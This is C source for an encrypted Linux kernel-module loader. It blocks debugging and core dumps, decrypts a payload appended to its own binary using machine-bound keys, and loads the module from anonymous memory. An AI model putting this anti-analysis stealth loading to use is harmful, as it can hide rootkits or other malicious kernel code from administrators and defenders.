/*
 * ELKM loader.c - Encrypted Linux x86-64 LKM loader
 *
 *        by vincitamorpatriae@gmail.com
 */

#define _GNU_SOURCE
#define _XOPEN_SOURCE 500	/* pread64 */

#include <curl/curl.h>

#include <openssl/crypto.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>	/* RAND_bytes */

#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/resource.h>	/* setrlimit */
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>		/* setrlimit */
#include <sys/types.h>

#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define procmoddisable "/proc/sys/kernel/modules_disabled"
#define produuid "/sys/class/dmi/id/product_uuid"
#define MINLKMSIZE 2048
#define UUID_LENGTH 32 + 4

#include "crypto.h"
#include "elf64.h"
#include "loader.h"

int
__libc_start_main(int argc, char **argv, char **envp)
{
	int fd = 0;
	int memfd = 0;

	long unsigned int payloadsize = 0;
	long unsigned int elfsize = 0;

	char *path;

	if (geteuid() != 0) {
#ifdef DEBUG
		fprintf(stderr, "need root\n");
#endif
		exit(1);
	}

	/* make sure we don't leak the decryption key in case of segfault
	 */
	nocoredumps();

	/* prevent observation and control of the execution of the loader to protect
	 * the password
	 */
	ptraceself();

	/* check whether the kernel disallows loading new LKMs
	 */
	if (!checklkmload())
		exit(1);

	path = getpathofself();

	fd = openelf(path);

	elfsize = elf64_size(fd);
	if (elfsize == 0)
		exit(1);

	payloadsize = binsize(path) - elfsize;

#ifdef DEBUG
	fprintf(stderr, "%s(): elfsize: %lu\n", __FUNCTION__, elfsize);
	fprintf(stderr, "%s(): payloadsize: %lu\n", __FUNCTION__, payloadsize);
#endif

	if (payloadsize < MINLKMSIZE) {
#ifdef DEBUG
		fprintf(stderr, "%s(): payload is too small to be a LKM\n",
		    __FUNCTION__);
#endif
		exit(1);
	}

	memfd = memfd_create("memfd", 0);
// TODO:
// https://lwn.net/Articles/811875/
// https://www.mail-archive.com/linux-kernel@vger.kernel.org/msg2223568.html
// extend memfd with ability to create "secret" memory areas
//	memfd = memfd_create("memfd", MFD_SECRET);
	if (memfd == -1) {
#ifdef DEBUG
		perror("memfd_create");
#endif
		exit(1);
	}

	lseek(fd, elfsize, SEEK_SET);
	lseek(memfd, 0, SEEK_SET);
	if (decryptwithproductuuid(fd, memfd))
		goto LOAD;

	lseek(fd, elfsize, SEEK_SET);
	lseek(memfd, 0, SEEK_SET);
	if (decryptwithinstanceid(fd, memfd))
		goto LOAD;

	lseek(fd, elfsize, SEEK_SET);
	lseek(memfd, 0, SEEK_SET);
	if (decryptwithenvironment(fd, memfd, envp))
		goto LOAD;

	lseek(fd, elfsize, SEEK_SET);
	lseek(memfd, 0, SEEK_SET);
	if (decryptwithinteractive(fd, memfd))
		goto LOAD;

LOAD:
	close(fd);

	loadlkm(memfd);

	close(memfd);

#ifdef DEBUG
	fprintf(stderr, "%s(): successfully loaded module\n", __FUNCTION__);
#endif

	exit(0);
}
